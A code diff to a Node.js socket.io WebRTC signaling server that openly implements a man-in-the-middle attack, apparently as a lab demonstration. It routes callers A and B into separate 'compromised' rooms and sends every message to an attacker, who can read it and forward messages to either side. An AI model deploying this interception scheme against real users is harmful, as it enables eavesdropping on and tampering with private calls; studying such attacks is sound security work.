@@ -5,8 +5,8 @@ var nodeStatic = require('node-static');
 var http = require('http');
 var socketIO = require('socket.io');
 
-var compromisedroom1 = "bad1";//compromised room for caller 1
-var compromisedroom2 = "bad2";//compromised room for caller 2
+var compromisedroom1 = "bad1";//compromised room for caller A
+var compromisedroom2 = "bad2";//compromised room for caller B
 var numClients = 0;
 
 var fileServer = new(nodeStatic.Server)();
@@ -15,7 +15,7 @@ var app = http.createServer(function(req, res) {
 }).listen(8080);
 
 var io = socketIO.listen(app);
-io.set('origins', '*:*');
+io.set('origins', '*:*');//allows CORS request
 io.sockets.on('connection', function(socket) {
 
   // convenience function to log server messages on the client
@@ -25,17 +25,17 @@ io.sockets.on('connection', function(socket) {
     socket.emit('log', array);
   }
 
-  //all messages filtered through attacker
+  /**
+   *Filters all communication from A/B through attacker
+   */  
   socket.on('message', function(message, room) {
-    log('Attacker Sniffed: ', message);
     socket.to("mitm").emit('sniff', message, room);
-    log("sniffed message:", message);
-    // for a real app, would be room-only (not broadcast)
-    //socket.broadcast.emit('message', message);
   });
 
 
-
+  /**
+   *Attacker function to send messages to A 
+   */  
   socket.on('forward_ToA', function(message, room) {
     log('Message forwarded to A: ', message);
     try{
@@ -45,6 +45,9 @@ io.sockets.on('connection', function(socket) {
     }
   });
 
+  /**
+   *Attacker function to send messages to B
+   */  
   socket.on('forward_ToB', function(message, room) {
     log('Message forwarded to B: ', message);
     try{
@@ -54,6 +57,17 @@ io.sockets.on('connection', function(socket) {
     }
   });
 
+  /**
+   * Handles room creation. Attacker is put in a "mitm" room and A and B are put into
+   * separate rooms (so communication can be controlled by attacker)
+   * 
+   * When A joins a room (bad1) which occurs when numclients%2 == 1
+   *    -A 'created' message is sent to room A so call preparation begins
+   * 
+   * When B joins a room (bad2) which occurs when numclients%2 == 0
+   *  -We send a "join" message to A to set isChannelReady to true
+   *  -We send a 'joined" message to B to set isChannelReady to true
+   */
   socket.on('create or join', function(room) {
     //MiTM
     if(room === "mitm"){
@@ -63,10 +77,6 @@ io.sockets.on('connection', function(socket) {
     }else{
     
     log('Received request to create or join room ' + room);
-
-   // var clientsInRoom = io.sockets.adapter.rooms[room];
-    //var numClients = clientsInRoom ? Object.keys(clientsInRoom.sockets).length : 0; 
-    //delted as we now separate into rooms
     log('Room ' + room + ' now has ' + numClients + ' client(s)');
 
     if ((numClients%2) === 1) {
@@ -84,11 +94,12 @@ io.sockets.on('connection', function(socket) {
       socket.emit('joined', compromisedroom2, socket.id);
       io.sockets.in(room).emit('ready');
       numClients++;
-    } else { // max two clients
+    } else { // This statement is no longer reached as we no longer limit rooms to 2
       socket.emit('full', room);
     }
   }});
 
+  //legacy function
   socket.on('ipaddr', function() {
     var ifaces = os.networkInterfaces();
     for (var dev in ifaces) {
